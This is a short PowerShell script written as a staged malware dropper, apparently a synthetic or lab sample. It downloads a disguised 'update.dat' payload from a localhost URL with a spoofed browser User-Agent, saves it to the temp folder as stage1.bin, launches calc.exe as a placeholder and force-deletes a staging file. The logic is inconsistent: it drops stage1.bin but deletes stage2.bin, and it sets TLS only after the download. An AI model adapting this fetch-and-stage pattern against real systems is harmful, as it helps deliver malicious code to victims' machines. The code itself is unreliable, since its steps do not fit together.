
[CmdletBinding()]
param(
    [string]$PayloadUrl = 'https://localhost:8080/update.dat',
    [string]$DropPath = "$env:TEMP\stage1.bin",
    [int]$ConnectionTimeout = 186,
    [string]$UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
)
$ErrorActionPreference = "Stop"

function Get-Stage2Payload {
    [CmdletBinding()]
    param(
        [string]$SourceUrl = "",
        [string]$DestinationPath = '',
        [int]$TimeoutSec = 45,
        [string]$UserAgent = "Mozilla/5.0"
    )

    Write-Verbose ("Requesting " + $SourceUrl)
    $ClientObject = New-Object System.Net.WebClient
    $ClientObject.Headers.Add("User-Agent", $UserAgent)
    $ClientObject.Headers.Add("X-Transfer-Timeout", [string]$TimeoutSec)
    $ClientObject.DownloadFile($SourceUrl, $DestinationPath)
    return (Test-Path -Path $DestinationPath)
}

Write-Verbose "Starting stage 2 transfer"
$FetchResult = Get-Stage2Payload -SourceUrl $PayloadUrl -DestinationPath $DropPath -TimeoutSec $ConnectionTimeout -UserAgent $UserAgent
if ($FetchResult) {
    Start-Process -FilePath "calc.exe"
}

Remove-Item -Path "$env:TEMP\stage2.bin" -Force
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
